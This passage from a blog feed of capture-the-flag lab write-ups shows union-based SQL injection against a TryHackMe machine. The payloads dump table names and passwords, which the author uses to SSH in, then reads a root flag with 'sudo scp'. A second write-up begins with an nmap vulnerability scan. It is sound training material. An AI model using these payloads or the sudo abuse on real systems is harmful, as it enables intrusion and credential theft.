&lt;p&gt;Out of curiosity, I tried loading &lt;code&gt;/item.php?id=robots.txt&lt;/code&gt; to see if I could get file inclusion without ascending. This doesn’t work, but throws another SQL error: “Unknown column ‘robots.txt in ‘where clause’“. This indicates that we’re definitely vulnerable to some kind of injection, since robots.txt is being treated as a column spec. In fact, this indicates that there must not be any quoting going on at all!&lt;/p&gt;
&lt;p&gt;And indeed, trying &lt;code&gt;/item.php?id=0 or 1=1&lt;/code&gt; brings up the same broken page as &lt;code&gt;/item.php?id=100&lt;/code&gt;. So I think what’s going on here is that /item.php is just doing some string filtering (it looks like it’s probably also checking if you’re trying to include a real file, as attempting to include non-existent files &lt;em&gt;doesn’t&lt;/em&gt; trigger it).&lt;/p&gt;
&lt;p&gt;What the hell, let’s throw &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sqlmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/sqlmap&quot;&gt;SQLMap&lt;/a&gt; at it anyway!&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sqlmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.105.134/item.php?id=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;       --dbms=mysql&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --dump-all&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; --batch&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Well, that didn’t work.&lt;/p&gt;
&lt;p&gt;Meanwhile, futzing around by hand I find that &lt;code&gt;/item.php?id=0 union select null, null, null, null, null&lt;/code&gt; works and displays a slightly &lt;em&gt;different&lt;/em&gt; error page (so, whatever the &lt;code&gt;id&lt;/code&gt; variable is being pushed into must be at the very end of the SQL statement). And, while “&lt;code&gt;&#039;&lt;/code&gt;” triggers the annoying error page, using a double quote (“&lt;code&gt;&quot;&lt;/code&gt;”) does not.  Using a bit of trial-and error, we can determine that all but the first of these columns are usable, though the fourth place is easiest to read. This at least let’s us figure out our first few flags.&lt;/p&gt;
&lt;p&gt;The database also appears to be running as root. Ruh roh!&lt;/p&gt;
&lt;p&gt;Now that we’re getting the hang of this, we can extract more information by using queries of the form: &lt;code&gt;/item.php?id=0 union (select null, null, null, &quot;something&quot;, null)&lt;/code&gt;. I’m going to focus on the actual SQL inside of these parenthesis.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#998418&quot;&gt;count&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;), &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; mysql&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;user&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;We have four users. We can enumerate them by replacing &lt;code&gt;count(*)&lt;/code&gt; with &lt;code&gt;User&lt;/code&gt; and tacking on a &lt;code&gt;limit&lt;/code&gt; clause; this just reveals that the only users are root and three standard Debian system users that are used for upgrades and maintenance.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#998418&quot;&gt;count&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;), &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; information_schema&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This reveals that there are 282 tables managed by this &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/mysql&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/mysql&quot;&gt;MySQL&lt;/a&gt; instance (ouch!). But how many tables are in the &lt;code&gt;park&lt;/code&gt; database (which is what’s serving up this site)?&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#998418&quot;&gt;count&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;*&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;), &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; information_schema&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;where&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; table_schema &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Only two. That seems much better. I wonder what they are?&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, table_name, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; information_schema&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;tables&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;where&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; table_schema &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;limit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;So we have two tables, &lt;code&gt;items&lt;/code&gt; and &lt;code&gt;users&lt;/code&gt;. Let’s see what the columns of the &lt;code&gt;users&lt;/code&gt; table are.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, column_name, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; information_schema&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;columns&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;where&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; table_schema &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;	and&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt; table_name &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;users&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;limit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;So, the columns are &lt;code&gt;id&lt;/code&gt;, &lt;code&gt;username&lt;/code&gt;, and &lt;code&gt;password&lt;/code&gt;. Nice. Let’s dig into that table.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;sql&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;select&lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt; null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;password&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;null&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; park&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;users&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#1E754F&quot;&gt;limit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#393A34&quot;&gt;, &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Unfortunately, trying to include the &lt;code&gt;username&lt;/code&gt; column triggers the annoying error, so all we can retrieve are two passwords, &lt;code&gt;D0nt3ATM3&lt;/code&gt; and &lt;code&gt;ih8dinos&lt;/code&gt;. Just for grins (and clued in by the structure of the flag questions), let’s see if we can &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; into the box as either of these using the user dennis.&lt;/p&gt;
&lt;p&gt;The second works for this purpose, and the first flag is right in dennis’ home directory.&lt;/p&gt;
&lt;p&gt;Poking around a bit, &lt;code&gt;sudo -l&lt;/code&gt; reveals that dennis can use scp via &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt;, and the test.sh file implies that there’s a /root/flag5.txt file. Since scp works like cp for local copies, we can grab this.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; scp&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /root/flag5.txt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; .&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; flag5.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Continuing to poke around, &lt;code&gt;cat .bash_history&lt;/code&gt; reveals the third flag (as well as a lot of scp attempts around /root/flag5.txt, which I just got).&lt;/p&gt;
&lt;p&gt;The ~/.viminfo file reveals two more potential flags: /boot/grub/fonts/flagTwo.txt and /tmp/flagFour.txt.&lt;/p&gt;
&lt;p&gt;But, as the TryHackMe room notes, there is no fourth flag.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 2 h 53 min&lt;/p&gt;</description>
    <pubDate>Wed, 02 Feb 2022 00:00:00 GMT</pubDate>
  </item><item>
    <title>Inclusion</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2022-02-01-inclusion</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2022-02-01-inclusion</guid>
    <description>&lt;p&gt;This room is intended to focus on &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/local-file-inclusion-attacks&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/local-file-inclusion-attacks&quot;&gt;local file inclusion attacks&lt;/a&gt;, so my guess is that hitting the machine with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; is probably unnecessary. But, I’m going to do it anyway, just in case.&lt;/p&gt;
&lt;p&gt;The target is 10.10.0.57. The website running there is basically a shell — most of the links, including the search box, don’t work. No JavaScript is loaded. The only links that &lt;em&gt;do&lt;/em&gt; work are the “View details” buttons underneath the bottom three articles. This calls an /article endpoint with a single parameter, &lt;code&gt;name&lt;/code&gt;. The resulting page looks like someone just dumped a plain text file between the &lt;code&gt;&amp;#x3C;body/&gt;&lt;/code&gt; tags.&lt;/p&gt;
&lt;p&gt;Given the purpose of the room, I’m going to guess they did.&lt;/p&gt;
&lt;p&gt;While it’s probably &lt;em&gt;pro forma&lt;/em&gt;, let’s run our usual &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt; scan just in case:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; inclusion&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.0.57&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;This gives the following output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Tue Feb  1 18:58:37 2022 as: nmap -v -oA inclusion -Pn -A -T4 -sS -script vuln -p- 10.10.0.57
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.0.57
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|     	MSF:ILITIES/UBUNTU-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/SUSE-CVE-2019-25017/	5.8	https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/	*EXPLOIT*
|     	MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	5.8	https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/	*EXPLOIT*
